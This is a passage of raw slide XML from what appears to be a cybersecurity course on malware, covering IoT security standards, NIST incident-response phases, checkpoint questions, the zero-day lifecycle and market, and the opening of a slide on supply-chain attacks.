                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>ETSI EN 303 645</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>ETSI</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>European IoT consumer baseline: no default passwords, keep software updated, use TLS for telemetry</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>European consumer IoT manufacturers</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="451038">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>EU Cyber Resilience Act</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>European Commission</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Legally binding security-by-design and vulnerability disclosure requirements for connected products sold in the EU</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>All manufacturers selling IoT in EU market</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFF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IoT Security Standards &amp; NIST Guidelines (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_iot_security_standards_map.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="3648194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="501819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IoT security standards landscape, multiple overlapping frameworks are converging on similar baseline requirements, with the EU Cyber Resilience Act introducing legally binding obligations for the first time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Response for Malware Events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Malware incident response</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> follows the NIST SP 800-61 Rev. 2 Computer Security Incident Handling Guide, a four-phase lifecycle of </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Preparation</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Detection &amp; Analysis</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Containment, Eradication &amp; Recovery</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Post-Incident Activity</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, with malware-specific procedures at each phase.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2093369"/>
            <a:ext cx="10555354" cy="2374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Preparation:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Deploy EDR, establish backup and recovery procedures, create and test incident response playbooks for specific malware classes (ransomware, worm, RAT).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Detection &amp; Analysis:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Identify infected systems via EDR alerts, SIEM correlation, user reports; triage severity; classify malware type; identify patient zero; scope the infection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Containment:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Isolate infected endpoints from the network (EDR network isolation, VLAN reassignment, or physical disconnection); block C2 domains and IPs at perimeter; preserve forensic evidence (memory dump, disk image) before remediation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Eradication:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Remove malware and persistence mechanisms (malicious scheduled tasks, registry run keys, WMI subscriptions); patch the exploited vulnerability; re-image if rootkit is suspected.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Recovery:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Restore systems from clean backups; validate integrity before returning to production; monitor closely for re-infection indicators.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Post-Incident Activity:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Document lessons learned; update detection rules with new IOCs; brief leadership on root cause and control gaps; submit IOCs to ISAC / threat intelligence sharing platforms.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Response for Malware Events (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_incident_response_lifecycl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Malware incident response lifecycle per NIST SP 800-61 Rev. 2, each phase has distinct technical and procedural requirements, and the circular structure emphasizes that post-incident learning continuously improves preparation for future incidents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Knowledge Checkpoint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Pause and verify your understanding of the core concepts covered so far. These checkpoint questions reflect the depth of understanding expected on assessments and in professional practice.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2093369"/>
            <a:ext cx="5192677" cy="254316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Concept Questions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="340556" y="2493369"/>
            <a:ext cx="5072677" cy="20931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Q1:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> A worm exploiting CVE-2017-0144 spreads without any user interaction. Which NIST SP 800-53 control would have been most effective at preventing the initial infection, and which would limit lateral spread after one host is compromised?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Q2:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Explain why a ransomware attacker uses AES-256 to encrypt files but RSA-2048 to protect the encryption key. What would happen if they used RSA for both operations?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Q3:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> A metamorphic virus produces copies with no shared byte sequences. Why is behavioral analysis (dynamic analysis) more effective than signature scanning for detecting it?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5643233" y="2093369"/>
            <a:ext cx="5192677" cy="254316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Scenario Questions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5703233" y="2493369"/>
            <a:ext cx="5072677" cy="20931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Q4:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> A user reports their computer is running normally but their company's financial reports have been accessed by an unknown party. Which malware class is the most likely culprit? What artifact would you look for first in your investigation?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Q5:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> An IoT smart camera on your corporate network initiates Telnet connections to random IP addresses every 30 seconds. What malware is the most likely cause? What immediate containment action should you take?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Q6:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Your EDR shows </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>winword.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> spawning </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>powershell.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> with a base64-encoded command, which then makes an outbound HTTPS connection to an IP in Romania. Map this activity to MITRE ATT&amp;CK technique IDs.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Knowledge Checkpoint (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_checkpoint_knowledge_map.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="4090199"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="546019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Malware concept map, understanding the relationships between malware classes, their delivery chains, and CIA triad impacts forms the integrated mental model needed to answer scenario questions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Zero-Day Exploits &amp; Malware Weaponization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zero-day vulnerability</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is a previously unknown software flaw for which no vendor patch exists at the time of discovery and exploitation. Zero-day exploits are weaponized as malware delivery mechanisms or payload components, providing maximum effectiveness because no signature-based or patch-based defense exists.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2093369"/>
            <a:ext cx="5192677" cy="28412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Zero-Day Lifecycle</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="340556" y="2493369"/>
            <a:ext cx="5072677" cy="23912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Discovery:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Researcher (internal, external, or criminal) discovers a previously unknown vulnerability in software or firmware.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Weaponization:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> The vulnerability is incorporated into an exploit module, reliable shellcode that consistently triggers the flaw to achieve code execution.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Deployment:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> The exploit is integrated into a malware campaign, exploit kit, or targeted APT attack tool.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Detection:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Security researchers or vendors identify the exploit through incident analysis or threat intelligence.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Patch &amp; Disclosure:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Vendor releases a patch; CVE assigned; public disclosure. The zero-day becomes an "N-day", a known, patched vulnerability.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5643233" y="2093369"/>
            <a:ext cx="5192677" cy="28412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Zero-Day Market</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5703233" y="2493369"/>
            <a:ext cx="5072677" cy="23912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Bug Bounty Programs:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Legitimate disclosure to vendors (Google Project Zero, HackerOne) for rewards of $500–$2M+.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exploit Brokers:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Commercial markets (Zerodium) pay $500K–$2.5M for iOS or Android zero-clicks; purchased by government customers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Gray Market:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Intelligence agencies and defense contractors purchase zero-days for offensive cyber operations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Black Market:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Criminal actors trade zero-days on darknet forums for criminal malware campaigns.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Zero-Day Exploits &amp; Malware Weaponization (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_zerodday_lifecycle.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="3470072"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="48400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Zero-day vulnerability lifecycle, the 'window of exposure' between vulnerability discovery and widespread patch adoption is the period during which defenders are completely blind to the specific attack vector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Supply Chain Attacks, Malware Through Trusted Channels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supply chain attack</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> compromises a target organization indirectly by injecting malicious code into a trusted software, hardware, or service provider that the target uses, exploiting the transitive trust relationship between the target and its vendors to bypass direct security controls.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2093369"/>
            <a:ext cx="10555354" cy="16957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Target Identification:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Attacker identifies a widely used software product, update mechanism, or hardware component trusted by the intended victim organizations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Vendor Compromise:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> The attacker compromises the vendor's build system, code repository, or software signing infrastructure rather than attacking target organizations directly.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Payload Injection:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Malicious code is inserted into a legitimate software update, build artifact, or hardware component that the vendor distributes to its customers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
